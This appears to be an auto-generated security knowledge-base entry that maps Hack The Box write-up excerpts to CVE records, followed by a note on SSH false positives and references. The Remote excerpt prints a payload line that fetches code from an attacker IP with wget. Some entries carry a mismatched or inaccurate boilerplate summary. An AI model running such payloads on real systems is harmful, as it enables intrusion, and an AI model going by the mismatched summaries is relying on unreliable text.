HTB machine Pit (official write-up, doc 346, 8960 chars, sha1 36990d7f3d79) describes CVE-2019-12744. Mechanism as documented on the machine: -------------------------------------------------------------------------------- - fix for CVE-2019-12744 (Remote Command Execution through unvalidated

Authoritative record: SeedDMS before 5.1.11 allows Remote Command Execution (RCE) because of unvalidated file upload of PHP scripts, a different vulnerability than CVE-2018-12940.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-12744) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Ready documents CVE-2018-19571 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Ready (official write-up, doc 304, 13458 chars, sha1 11ead46fc238) describes CVE-2018-19571. Mechanism as documented on the machine: There are multiple vulnerabilities for Gitlab but we are going to focus on a way to exploit a combination of SSRF (CVE-2018-19571) and CRLF (CVE-2018-19585) vulnerabilities. According to the GitLab Security Release, both vulnerabilities are taking place in this version of Gitlab. The SSRF vulnerability is on the specific version of Redis. We are going to trigger SSRF via importing a new repository by URL. First we create a new project.

Authoritative record: GitLab CE/EE, versions 8.18 up to 11.x before 11.3.11, 11.4 before 11.4.8, and 11.5 before 11.5.1, are vulnerable to an SSRF vulnerability in webhooks.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2018-19571) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Remote documents CVE-2019-18988 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Remote (official write-up, doc 234, 8727 chars, sha1 85b05b0a4681) describes CVE-2019-18988. Mechanism as documented on the machine: ... payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \ xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft- com:xslt" \ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\ <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \ { string cmd = "wget 10.10.14.7/rce"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\

Authoritative record: TeamViewer Desktop through 14.7.1965 allows a bypass of remote-login access control because the same key is used for different customers' installations. It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPasswordAES in the current version of the product. If an attacker were to know this key, they could decrypt protect informatio

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-18988) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**RouterSpace documents CVE-2021-3156 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine RouterSpace (official write-up, doc 444, 10456 chars, sha1 cfc55fdbfce4) describes CVE-2021-3156. Mechanism as documented on the machine: The exploit is successful and the root flag can be found in /root .

Authoritative record: Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via \"sudoedit -s\" and a command-line argument that ends with a single backslash character.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2021-3156) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Schooled documents CVE-2020-14321 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Schooled (official write-up, doc 335, 10128 chars, sha1 c1880f5e3bb1) describes CVE-2020-14321. Mechanism as documented on the machine: Another vulnerability affecting Moodle 3.9 (CVE-2020-14321) allows escalation of privileges from the teacher role to the manager role. A PoC exploit for this vulnerability is available on GitHub. A video walkthrough is also available. First we need to grab the ID of the current user (Manuel Phillips). One way to do this is looking at the URL of the profile page linked from the top right menu ( /moodle/user/profile.php?id=24 ). Next, we click the Site home link on the left and then select the Mathematics course. We access the participant list:

Authoritative record: In Moodle before 3.9.1, 3.8.4, 3.7.7 and 3.5.13, teachers of a course were able to assign themselves the manager role within that course.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-14321) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Shared documents CVE-2022-0543 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Shared (official write-up, doc 483, 13696 chars, sha1 7920b6345a62) describes CVE-2022-0543. Mechanism as documented on the machine: Having confirmed that we can execute code as dan_smith , we can now easily get a reverse shell in the same fashion. We use the following python payload:

Authoritative record: It was discovered, that redis, a persistent key-value database, due to a packaging issue, is prone to a (Debian-specific) Lua sandbox escape, which could result in remote code execution.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2022-0543) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Tentacle documents CVE-2020-7247 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Tentacle (official write-up, doc 310, 9385 chars, sha1 f401168879ad) describes CVE-2020-7247. Mechanism as documented on the machine: Nmap reveals that port 25 (smtp) is open and OpenSMTPD service is running on this port. A vulnerability (CVE-2020-7247) was discovered in OpenSMTPD 6.6 that allows remote command execution (RCE). Public exploit is available for this vulnerability. We download and modify the exploit to include j.nakazawa@realcorp.htb as a valid email in the recipient address.

Authoritative record: smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the "uncommented" default configuration. The issue exists because of an incorrect return value upon failure of input validation.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-7247) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Time documents CVE-2019-12384 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Time (official write-up, doc 286, 6519 chars, sha1 395dcc90656b) describes CVE-2019-12384. Mechanism as documented on the machine: Stand up a Netcat listener on port 4444 and then send the below payload.

Authoritative record: FasterXML jackson-databind 2.x before 2.9.9.1 might allow attackers to have a variety of impacts by leveraging failure to block the logback-core class from polymorphic deserialization. Depending on the classpath content, remote code execution may be possible.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-12384) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Ypuffy documents CVE-2018-14665 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Ypuffy (official write-up, doc 154, 8241 chars, sha1 351c9e0269c3) describes CVE-2018-14665. Mechanism as documented on the machine: The xorg-x11-server package on the system suffers from a root privilege escalation vulnerability (CVE-2018-14665). This vulnerability was discovered by Narendra Shinde (@nushinde), while the exploit code below was authored by Marco Ivaldi (@0xdea). https://lists.x.org/archives/xorg-announce/2018-October/002927.html https://www.exploit-db.com/exploits/45742

Authoritative record: A flaw was found in xorg-x11-server before 1.20.3. An incorrect permission check for -modulepath and -logfile options when starting Xorg. X server allows unprivileged users with the ability to log in to the system via physical console to escalate their privileges and run arbitrary code under root privileges.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2018-14665) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

## Variations

Not yet researched.

## Technology / Framework Considerations

Not yet researched.

## API Considerations

Not yet researched.

## Attack Chains

- `reachable-admin-service-to-relayed-credential-to-lateral` — Policy-violating administrative service reachability to relayed server credentials to lateral movement (goal: `credential_theft_and_lateral`)

## Real-World Examples

Not yet researched.

## Common False Positives

**An SSH service answering on an unusual high TCP port on a consumer or edge device is a vendor port-forward feature, not attacker persistence; the discriminator is whether the port serves the vendor's own management tunnel rather than a general-purpose login.**

The observation that produces this false positive is port 22 absent and SSH present on, for example, TCP 20001, which reads as an operator having moved the shell off the default port to evade detection. Measured across real internet-wide data, SSH appeared on non-standard ports nearly as often as on port 22, so a non-standard port is a population norm rather than an anomaly. A concrete benign instance is a home router whose dropbear SSH service is present and running on port TCP 0.0.0.0:20001 and serves to only allow port forwarding to enable remote cloud connections to the device's configuration service for app-based configuration. That is a vendor cloud-management tunnel: the daemon exists to forward a vendor app session, and it is reachable from the LAN side or the vendor's path by design. The distinguishing test is not the port number but the purpose: does the SSH daemon grant a general interactive shell to an arbitrary source, or does it only relay the vendor management protocol, and is the account/key set constrained to that relay? A high port with a general shell and rotating unknown host keys is a finding; a high port wired to one vendor management endpoint is inventory.

*Disproof:* The high-port SSH service hands an interactive shell to an unexpected source, or its host key rotates across scans without a firmware change, showing the daemon is being used as an operator foothold rather than as a vendor management tunnel.
**Hypothesis:** An SSH service listening on an unusual high TCP port is an exposed remote service finding.
- Invalidated by: The listener is a vendor port forward terminating on a managed relay that accepts connections only from the vendor's own management subnet, and no account authenticated from the scanning source; the non-standard port is the vendor's published configuration, not an additional exposure.
- **Rejection rule:** A non-standard port is not a finding by itself. Establish what the listener terminates on, whether logins are restricted to a vendor relay, and whether authentication succeeded from an untrusted source; only the last of those is an exposed remote service.

## Validation

Not yet researched.

## Impact

Not yet researched.

## Related Bug Classes

Not yet researched.

## References

- **academy.hackthebox.com** (docs)
  - <https://academy.hackthebox.com/course/preview/active-directory-ldap>
  - <https://academy.hackthebox.com/course/preview/active-directory-powerview>
- **attack.mitre.org** (taxonomy)
  - <https://attack.mitre.org/tactics/TA0001/>
  - <https://attack.mitre.org/techniques/T1133/>
- **blog.silentsignal.eu** (writeup)
  - <https://blog.silentsignal.eu/2026/06/05/unauthenticated-rce-as-qsecofr-via-ibm-i-management-central/>
- **claroty.com** (research)
  - <https://www.claroty.com/blog/claroty-team82-state-of-cps-security-2025-report-building-management-system-exposures>
- **cwe.mitre.org** (taxonomy)
  - <https://cwe.mitre.org/data/definitions/119.html>
  - <https://cwe.mitre.org/data/definitions/193.html>
  - <https://cwe.mitre.org/data/definitions/20.html>
  - <https://cwe.mitre.org/data/definitions/200.html>
  - <https://cwe.mitre.org/data/definitions/284.html>
  - <https://cwe.mitre.org/data/definitions/287.html>
  - <https://cwe.mitre.org/data/definitions/434.html>
  - <https://cwe.mitre.org/data/definitions/502.html>
  - <https://cwe.mitre.org/data/definitions/521.html>
  - <https://cwe.mitre.org/data/definitions/640.html>
  - <https://cwe.mitre.org/data/definitions/755.html>
  - <https://cwe.mitre.org/data/definitions/787.html>
  - <https://cwe.mitre.org/data/definitions/862.html>
  - <https://cwe.mitre.org/data/definitions/863.html>
  - <https://cwe.mitre.org/data/definitions/91.html>
  - <https://cwe.mitre.org/data/definitions/918.html>
- **helpnetsecurity.com** (blog)
  - <https://www.helpnetsecurity.com/2026/03/24/detectify-ip-range-scanning/>
- **labs.watchtowr.com** (research)
  - <https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/>
- **raw.githubusercontent.com** (writeup)
  - <https://raw.githubusercontent.com/ajcriado/htb-writeups/main/Academy/CPTS/Content%20Summary/04.%20Footprinting.md>
- **securelist.com** (research)
  - <https://securelist.com/tr/network-anomaly-detection-in-kata/120892/>
- **services.nvd.nist.gov** (research)
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2008-4250>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2016-3714>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2018-14665>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2018-19571>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-11043>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-11447>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-12384>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-12744>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-14287>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-18818>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-18988>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-19520>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-20933>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-14321>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-29599>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-7247>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-8165>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-9484>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-9496>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-21311>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-3156>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-0492>
  - <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-0543>
- **talosintelligence.com** (vendor_advisory)
  - <https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2291>

Every item above is gated on >= 2 distinct publisher hosts (`wks/quality.py`, rule R1). Publisher diversity, not citation count, is what makes these corroborated.
